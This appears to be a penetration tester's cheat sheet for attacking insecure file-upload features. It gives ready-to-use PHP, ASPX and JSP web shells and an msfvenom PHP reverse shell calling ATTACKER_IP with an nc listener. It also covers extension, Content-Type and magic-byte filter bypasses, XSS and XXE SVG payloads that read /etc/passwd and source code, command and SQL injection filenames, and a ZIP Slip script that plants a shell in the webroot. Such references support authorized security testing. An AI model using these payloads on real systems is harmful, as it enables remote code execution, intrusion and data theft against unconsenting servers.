# Insecure File Upload

## 1. Quick Testing Flow

1. Upload `.php`
2. If blocked → intercept with Burp
3. Modify filename
4. Modify Content-Type
5. Try double extensions
6. Try alternate PHP extensions
7. Try magic bytes
8. Identify backend language
9. Upload shell
10. Escalate to reverse shell


## 2. Absent Validation (Arbitrary Upload)

### Indicators

- No restriction in file dialog
- “All Files” selectable
- No server-side error
- Upload success for `.php`


### Basic Execution Test

```
echo '<?php echo "TEST"; ?>' > test.php
```

#### Upload and access:

```
/uploads/test.php
```

If executed → Arbitrary File Upload confirmed.

## 3. Identify Backend Language

### Try:

```
/index.php
/index.jsp
/index.asp
/index.aspx
```

### Or use Wappalyzer.

Match shell to language.

## 4. Web Shells

### PHP

```
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

#### Execute:

```
/uploads/shell.php?cmd=id
```

### ASPX

```
<%@ Page Language="C#" %><%Response.Write(Request.QueryString["cmd"]);%>
```

### JSP

```
<% out.println(request.getParameter("cmd")); %>
```

## 5. Reverse Shell

### msfvenom (PHP)

```
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw > reverse.php
```

#### Listener:

```
nc -lvnp ATTACKER_PORT
```

#### Visit uploaded file.

```
/uploads/reverse.php
```

## 6. Blacklist Filter Bypass

### Backend example:

```
$blacklist = array('php', 'php7', 'phps');
```

### Weaknesses

- Case sensitive
- Not comprehensive
- Misses alternate extensions


### Bypass Techniques

#### Case Bypass

```
shell.pHp
```

#### Alternate PHP Extensions

```
shell.phtml
shell.php5
shell.phar
shell.inc
```

#### Fuzz Extensions (Burp Intruder)

Use:
- SecLists Web Extensions
- PayloadsAllTheThings PHP extensions

Look for:
- Different response length
- 200 OK
- Different error message

## 7. Whitelist Filter Bypass

### Weak regex example:

```
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName))
```

#### Double Extension

```
shell.jpg.php
```

#### Reverse Double Extension (Apache misconfig)

```
shell.php.jpg
```

#### Works if Apache uses:

```
<FilesMatch ".+\.ph(ar|p|tml)">
```

#### Character Injection

Try:

```
shell.php%00.jpg
shell.php%20.jpg
shell.php%0a.jpg
shell.php%0d0a.jpg
shell.php:.jpg
shell.php/.jpg
```

#### Generate fuzz list:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
  for ext in '.php' '.phps'; do
    echo "shell$char$ext.jpg" >> wordlist.txt
    echo "shell$ext$char.jpg" >> wordlist.txt
    echo "shell.jpg$char$ext" >> wordlist.txt
    echo "shell.jpg$ext$char" >> wordlist.txt
  done
done
```

## 8. Content-Type Filter Bypass

### Backend example:

```php
$type = $_FILES['uploadFile']['type'];
```

### Modify Request

#### Change:

```
Content-Type: application/x-php
```

#### To:

```
Content-Type: image/jpeg
```

#### Note:
There are TWO content-types in multipart:
- Main request header
- File part header

Usually modify file part header.

## 9. MIME-Type / Magic Byte Bypass

### Backend example:

```
mime_content_type($_FILES['uploadFile']['tmp_name']);
```

### GIF Magic Byte Trick

```
printf "GIF89a\n<?php system($_GET['cmd']); ?>" > shell.php
```

### Upload as:

```
shell.php
```

If server validates MIME but executes PHP → bypass successful.

## 10. Limited File Upload Attacks (Non-RCE)

Even if arbitrary upload fails, test:

### XSS via Metadata

```
exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
```

Upload and trigger metadata display.

## XSS via SVG

```
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert(1)</script>
</svg>
```

Upload and view.

---

### XXE via SVG

```
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE (Read PHP Source)

```
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Decode base64.

## 11. DoS via Upload

### Large File

Upload multi-GB file.

### ZIP Bomb

Nested compression → disk exhaustion.

### Pixel Flood

Craft large-dimension image → memory exhaustion.


## 12. File Name Injection

### Try:

```
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

If used in system command → command injection.

### XSS in File Name

```
<script>alert(1)</script>.jpg
```


### SQLi in File Name

```
file';select sleep(5);--.jpg
```

## 13. Upload Directory Discovery

### Techniques

- Force duplicate filename
- Very long filename (5000+ chars)
- Trigger server errors
- Use LFI/XXE to read source code
- Fuzz common paths:

```
/uploads/
/images/
/files/
/profile_images/
/assets/
```

## 14. Basic ZIP Upload Test

### Create Test ZIP

```
echo "test" > test.txt
zip test.zip test.txt
```

### Upload `test.zip`.

Check:
- Is it extracted automatically?
- Where are files extracted?
- Are paths predictable?

Try accessing:

```
/uploads/test.txt
/uploads/test/test.txt
```

## 15. ZIP Slip (Path Traversal in Archive)

If the application automatically extracts uploaded ZIP archives without sanitizing paths, you may escape the extraction directory.

### Create Malicious ZIP (Reliable Method)

```
python3 - << EOF
import zipfile
z = zipfile.ZipFile("zipslip.zip", "w")
z.writestr("../../../../var/www/html/shell.php", "<?php system($_GET['cmd']); ?>")
z.close()
EOF
```

### Verify internal archive path:

```
unzip -l zipslip.zip
```

Confirm traversal path exists inside archive.

### Upload and test:

```
/shell.php?cmd=id
```

## 16. Windows-Specific Attacks

### Reserved Names

```
CON
COM1
LPT1
NUL
```

### Special Characters

```
|
<
>
*
?
```

### 8.3 Shortname Abuse

```
WEB~1.CON
```

May overwrite `web.conf`.

